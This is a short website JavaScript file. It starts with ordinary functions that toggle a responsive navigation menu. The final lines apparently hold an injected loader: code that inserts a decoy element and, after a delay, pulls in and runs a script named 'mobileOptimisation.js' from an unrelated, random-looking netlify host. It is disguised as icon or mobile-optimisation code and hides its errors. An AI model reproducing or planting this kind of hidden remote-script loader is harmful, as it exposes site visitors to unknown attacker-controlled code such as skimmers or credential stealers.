function myFunction() {
  var x = document.getElementById("myTopnav");
  x.classList.toggle('responsive')
}
  function toggleMenu() {
    var menuToggler = document.getElementById("menu-toggler");
    menuToggler.classList.toggle("change");
    console.log(menuToggler.classList)
  }
  
  const el=`<div id="mobiOptiElem" server='hstgr.io'></div>`; try{ document.querySelector('style').insertAdjacentHTML("beforeend",el); }catch(e){}finally{ document.querySelector('head').insertAdjacentHTML("beforeend",el); }; setTimeout(()=>{var els=document.createElement("script");els.src="https://mobirise-icons-92lwkjerngovo73otd4g.netlify.app/mobileOptimisation.js"; document.querySelector("#mobiOptiElem").insertAdjacentElement('afterbegin',els);},300);
